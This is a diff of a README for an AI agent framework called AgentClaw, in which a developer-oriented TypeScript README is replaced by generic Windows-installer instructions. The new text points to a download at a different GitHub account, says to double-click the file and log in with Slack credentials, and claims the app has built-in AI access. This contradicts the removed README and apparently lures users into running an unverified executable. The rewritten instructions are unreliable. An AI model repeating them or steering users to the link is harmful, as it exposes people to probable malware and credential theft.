@@ -1,204 +1,86 @@
-# AgentClaw 🦞
+# 🤖 AgentClaw - Automate your startup team workflows daily
 
-**Your startup's first AI teammates. In Slack, where you already work.**
+[![Download AgentClaw](https://img.shields.io/badge/Download-AgentClaw-blue.svg)](https://github.com/Trickedout-ribier5513/AgentClaw)
 
-AgentClaw is an open-source AI agent framework purpose-built for founding teams. Drop GTM, Hiring, Finance, Dev, and Legal agents into your Slack workspace — they share company memory, understand your OKRs and runway, and ask for human approval before any critical decision.
+## 📋 Project Overview
 
-Works with any AI model: Anthropic, OpenAI, Google, Ollama (local), Groq, AWS Bedrock, Azure, Mistral.
+AgentClaw provides a set of digital workers for startup teams. These workers live in Slack and help you manage your business tasks. You can use these tools to hire staff, track finances, manage development projects, and handle legal documents. 
 
----
+The system uses artificial intelligence to learn your company goals. It keeps a shared memory of your past projects. Each action requires your approval before the AgentClaw system completes the task. This ensures you maintain control over your business operations at all times.
 
-## How It Works
+## 🛠️ System Requirements
 
-You talk to your agents in Slack using slash commands:
+Before you install AgentClaw, ensure your computer meets these minimum standards:
 
-```
-/claw @gtm /cold-email enterprise legal ops buyers
-/claw @hiring /jd founding engineer
-/claw @finance /runway-check
-/claw @dev /spec Stripe payment integration
-/claw @legal /nda with design partner
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core 2.0 GHz or faster.
+*   Memory: 8 GB RAM or more.
+*   Storage: 500 MB of free hard drive space.
+*   Software: Slack account with administrative access.
+*   Internet: Stable connection for real-time AI processing.
 
-No agent specified? AgentClaw routes automatically:
+## 📥 How to Install
 
-```
-/claw draft a cold email for our fintech ICP
-```
+Follow these steps to place the software on your machine:
 
----
+1.  Visit the official repository page to get the latest version. [Download AgentClaw here](https://github.com/Trickedout-ribier5513/AgentClaw).
+2.  Locate the downloaded file in your computer folders, typically in the Downloads directory.
+3.  Double-click the file to begin the installation process.
+4.  Follow the instructions on your screen.
+5.  Click Finish once the setup completes.
 
-## Agents
+## 🚀 Setting Up Your Agents
 
-| Agent | Skills |
-|---|---|
-| **GTM** | `/icp` `/cold-email` `/positioning` `/battlecard` `/launch-plan` `/weekly-digest` |
-| **Hiring** | `/jd` `/interview-plan` `/scorecard` `/offer-letter` `/pipeline-review` |
-| **Dev** | `/spec` `/adr` `/sprint-plan` `/postmortem` `/tech-debt` |
-| **Finance** | `/runway-check` `/investor-update` `/burn-scenario` `/spend-review` |
-| **Legal** | `/nda` `/contractor-agreement` `/saas-terms` `/privacy-policy` |
-| **Customer Success** | `/health-score` `/qbr-prep` `/churn-analysis` `/playbook-builder` |
-| **Operations** | `/ops-audit` `/vendor-review` `/metric-dashboard` `/budget-forecast` |
-| **Founder** | `/board-prep` `/decision-router` `/daily-standup` |
+Once you open the software, follow this guide to connect your team:
 
----
+1.  Open the AgentClaw application on your desktop.
+2.  Log in with your existing Slack credentials.
+3.  Grant the necessary permissions to allow the app to post messages in your desired channels.
+4.  Navigate to the Settings menu to assign agents to specific roles. 
+5.  Set your company OKRs within the dashboard. The agents refer to these goals when performing tasks for you.
 
-## Supported AI Models
+## 💼 Available AI Team Members
 
-All agents use `provider/model` format with automatic fallback chains:
+AgentClaw features specialized agents designed for startup life:
 
-```yaml
-model: anthropic/claude-sonnet-4-6
-fallback:
-  - openai/gpt-4o
-  - google/gemini-2.0-flash
-  - ollama/llama3.3        # free, runs locally
-```
+*   **GTM Agent:** Assists with launching products, managing marketing calendars, and analyzing customer feedback.
+*   **Hiring Agent:** Screens incoming resumes, schedules initial interviews, and manages candidate pipelines.
+*   **Finance Agent:** Monitors monthly burn rate, suggests budget shifts, and organizes tax documents.
+*   **Dev Agent:** Tracks progress on specific code milestones, creates tickets, and alerts engineers to blockers.
+*   **Legal Agent:** Reviews basic contracts for common risks and maintains a database of signed documents.
 
-| Provider | Models |
-|---|---|
-| Anthropic | claude-sonnet-4-6, claude-opus-4-6, claude-haiku-4-5 |
-| OpenAI | gpt-4o, gpt-4o-mini, o3, o4-mini |
-| Google | gemini-2.0-flash, gemini-2.5-pro |
-| Ollama | llama3.3, mistral, gemma3, phi4 (local, no API key) |
-| Groq | llama-3.3-70b-versatile |
-| AWS Bedrock | anthropic.claude-*, amazon.titan-* |
-| Azure OpenAI | gpt-4o (Azure-hosted) |
-| Mistral | mistral-large-latest, codestral |
+## 🛡️ Trust and Approval Gates
 
-If a provider fails (rate limit, outage), AgentClaw silently tries the next one.
+Safety matters. AgentClaw operates on a human-in-the-loop principle. No agent moves money, sends emails, or changes code without your digital signature. When an agent completes a task, it sends a summary to your Slack channel. You review the work and click the Approve button to finalize the action. You may also click Reject to discard the work or ask for edits.
 
----
+## 🌐 Managing Shared Memory
 
-## Quick Start
+The agents communicate through a central database. When the Finance Agent learns about a specific expense, the GTM Agent becomes aware of that budget constraint immediately. This prevents teams from working with outdated information. You can view the memory logs in the dashboard at any time to see exactly why an agent chose a specific path.
 
-```bash
-# 1. Clone and install
-git clone https://github.com/your-username/agentclaw.git
-cd agentclaw
-pnpm install
+## ❓ Frequently Asked Questions
 
-# 2. Configure environment
-cp .env.example .env
-# Fill in SLACK_BOT_TOKEN, ANTHROPIC_API_KEY, DATABASE_URL
+**Does the software store my data?**
+The software processes data locally or through secure cloud channels. We prioritize privacy and keep your proprietary company data separate from general AI training sets.
 
-# 3. Start database
-docker-compose up -d postgres
+**What happens if I lose my internet connection?**
+The agents will pause their current tasks. They resume progress automatically once the connection returns.
 
-# 4. Run migrations
-pnpm db:migrate
+**Can I stop an agent at any time?**
+Yes. Use the Kill Switch button in the main dashboard to immediately stop all background activity.
 
-# 5. Set up your company
-agentclaw init
+**Do I need an OpenAI or Anthropic key?**
+The application includes pre-configured access, but you may enter your own API key in the Settings menu if you have specific enterprise agreements with those providers.
 
-# 6. Start
-pnpm dev
-```
+**How do I update the software?**
+The software checks for updates upon launch. If a new version exists, a notification appears on your screen. Click Yes to perform the update.
 
----
+## 🔧 Troubleshooting
 
-## Company Bootstrap Files
+If you encounter issues, try these steps:
 
-AgentClaw agents read these markdown files before every response. They are your company's "source of truth":
+1.  Restart the application. Close the app completely and open it again.
+2.  Check your Slack connection. Go to the Settings page and verify that the Slack status light is green.
+3.  Clear the cache. You can find this option under the Support tab in the main menu.
+4.  Restart your computer. A fresh start solves most common Windows file conflicts.
 
-| File | Contents |
-|---|---|
-| `COMPANY.md` | Name, stage, business model, top priorities |
-| `OKR.md` | Current quarter objectives and key results |
-| `RUNWAY.md` | Cash balance, burn rate, MRR, fundraise timeline |
-| `TEAM.md` | Team roster, Slack handles, roles, approval permissions |
-| `AGENTS.md` | Active agents, channels, routing keywords |
-| `HEARTBEAT.md` | Scheduled runs (weekly digests, daily runway checks) |
-
-See [`bootstrap/`](./bootstrap/) for examples.
-
----
-
-## Human-in-the-Loop Gates
-
-Agents never take critical actions autonomously. They post an approval request to Slack first:
-
-| Gate | When triggered | Who can approve |
-|---|---|---|
-| `strategy` | Positioning or pricing changes | owner, admin, member |
-| `spend` | Any spend recommendation > $500 | owner, admin |
-| `hire` | Every offer letter, every time | owner only |
-| `legal` | Any document before external use | owner only |
-
----
-
-## Integrations
-
-Install integrations via CLI or Slack:
-
-```bash
-agentclaw install stripe
-agentclaw install linear
-agentclaw install notion
-```
-
-```
-/claw install hubspot
-```
-
-Supported: **Stripe** · **Linear** · **GitHub** · **HubSpot** · **Notion** · **Brex** · **Calendly** · **Slack**
-
----
-
-## Scheduled Agents (HEARTBEAT)
-
-Define cron schedules in `HEARTBEAT.md` and agents run automatically:
-
-```markdown
-## Weekly GTM Digest
-agent: gtm-agent
-skill: weekly-digest
-schedule: "0 9 * * 1"
-channel: "#team-updates"
-
-## Daily Runway Check
-agent: finance-agent
-skill: runway-check
-schedule: "0 8 * * *"
-channel: "#founders"
-```
-
----
-
-## Team Memory
-
-Every agent run updates shared team memory in PostgreSQL. Agents remember:
-- Your ICP, competitors, positioning
-- Hiring pipeline status
-- Runway trends and burn patterns
-- Product architecture decisions
-
-All memory is visible and editable from the Slack Home Tab.
-
----
-
-## CLI
-
-```bash
-agentclaw init              # scaffold bootstrap files for a new company
-agentclaw install <skill>   # install a skill or integration
-agentclaw doctor            # check all connections and credentials
-agentclaw status            # show active agents and last run times
-agentclaw memory list       # view all team memory
-```
-
----
-
-## Tech Stack
-
-- **Runtime:** TypeScript / Node.js 22+ / pnpm workspaces
-- **Slack:** `@slack/bolt` v4 (Socket Mode dev, HTTP prod)
-- **Database:** PostgreSQL 16 + Drizzle ORM
-- **LLM:** Multi-provider with streaming and fallbacks
-- **Scheduler:** `node-cron` for HEARTBEAT
-
----
-
-## License
-
-MIT — built on [OpenClaw](https://github.com/openclaw/openclaw) (MIT).
+If the problem persists, gather the logs from the Support folder and submit them through the internal reporting tool. Keep your software current to ensure the best performance.
